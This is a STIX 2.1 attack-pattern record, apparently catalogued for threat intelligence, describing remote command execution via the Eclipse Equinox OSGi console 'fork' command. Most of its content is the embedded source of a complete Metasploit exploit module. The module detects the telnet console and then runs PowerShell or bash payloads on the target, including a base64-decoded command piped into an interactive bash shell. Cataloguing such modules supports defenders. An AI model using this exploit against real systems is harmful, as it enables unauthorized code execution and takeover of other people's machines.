{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ed05c63-1562-4813-8984-15d8218933e5",
    "created": "2024-08-14T17:06:54.327291Z",
    "modified": "2024-08-14T17:06:54.327295Z",
    "name": "Eclipse Equinox OSGi Console Command Execution",
    "description": " Exploit Eclipse Equinox OSGi (Open Service Gateway initiative) console 'fork' command to execute arbitrary commands on the remote system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/osgi_console_exec.rb",
            "external_id": "osgi_console_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.eclipse.org/equinox/documents/quickstart-framework.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'base64'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  TELNET_IAC = Msf::Exploit::Remote::Telnet\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Eclipse Equinox OSGi Console Command Execution',\n      'Description'    => %q{\n        Exploit Eclipse Equinox OSGi (Open Service Gateway initiative) console\n        'fork' command to execute arbitrary commands on the remote system.\n      },\n      'Author'         =>\n        [\n          'Quentin Kaiser <kaiserquentin@gmail.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n       [\n         ['URL', 'https://www.eclipse.org/equinox/documents/quickstart-framework.php']\n       ],\n      'Platform' => %w{ linux win },\n      'Arch' => [ARCH_ARMLE, ARCH_AARCH64, ARCH_X86, ARCH_X64],\n      'Targets'=> [\n        [ 'Linux (Bash Payload)', { 'Platform' => 'linux' } ],\n        [ 'Windows (Powershell Payload)', { 'Platform' => 'win' } ]\n       ],\n      'CmdStagerFlavor' => [ 'bourne' ],\n      'DisclosureDate'  => '2018-02-13',\n      'DefaultTarget'   => 0))\n    deregister_options('SRVHOST', 'SRVPORT', 'SSL', 'SSLCert', 'URIPATH')\n    register_options([\n      OptInt.new('TIME_WAIT', [ true, 'Time to wait for payload to be executed', 20])\n    ])\n  end\n\n  def check\n    connect\n    res = sock.get_once\n    if res == TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_ECHO+\\\n        TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_SGA+\\\n        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_NAWS+\\\n        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_TTYPE\n      # terminal type 'xterm-256color' = \\x78\\x74\\x65\\x72\\x6D\\x2D\\x32\\x35\\x36\\x63\\x6F\\x6C\\x6F\\x72\n      sock.put(TELNET_IAC::IAC+TELNET_IAC::SB+TELNET_IAC::OPT_TTYPE+\\\n        \"\\x00xterm-256color\"+TELNET_IAC::IAC+TELNET_IAC::SE)\n      res = sock.get_once\n    end\n    disconnect\n    if res && res == \"osgi> \"\n      return Exploit::CheckCode::Vulnerable\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    begin\n      print_status(\"Accessing the OSGi console ...\")\n\n      unless check == Exploit::CheckCode::Vulnerable\n        fail_with(Failure::NoTarget, \"#{peer} - Failed to access the OSGi console\")\n      end\n\n      if target['Platform'] == \"win\" then\n        exec_command(\"fork \\\"#{cmd_psh_payload(payload.encoded, payload_instance.arch.first, {encode_final_payload: true, remove_comspec: true})}\\\"\")\n      else\n        execute_cmdstager({:flavor => :bourne})\n      end\n\n      print_status(\"#{rhost}:#{rport} - Waiting for session...\")\n\n      (datastore['TIME_WAIT']).times do\n        Rex.sleep(1)\n        # Success! session is here!\n        break if session_created?\n      end\n    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout => e\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - #{e.message}\")\n    ensure\n      disconnect\n    end\n  end\n\n  def exec_command(cmd)\n      connect\n      res = sock.get_once\n      if res == TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_ECHO+\\\n        TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_SGA+\\\n        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_NAWS+\\\n        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_TTYPE\n        sock.put(TELNET_IAC::IAC+TELNET_IAC::SB+TELNET_IAC::OPT_TTYPE+\\\n          \"\\x00xterm-256color\"+TELNET_IAC::IAC+TELNET_IAC::SE)\n        res = sock.get_once\n      end\n      print_status(\"Exploiting...\")\n      sock.put(\"#{cmd}\\r\\n\")\n      res = sock.get\n      sock.put(\"disconnect\\r\\n\")\n      res = sock.get\n      sock.put(\"y\\r\\n\")\n  end\n\n  def execute_command(cmd, opts={})\n    cmd_b64 = Base64.encode64(cmd).gsub(/\\s+/, \"\")\n    # Runtime.getRuntime().exec() workaround on Linux. Requires bash.\n    exec_command(\"fork \\\"bash -c {echo,#{cmd_b64}}|{base64,-d}|{bash,-i}\\\"\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-02-13",
    "x_mitre_platforms": [
        "%w{ linux win }"
    ]
}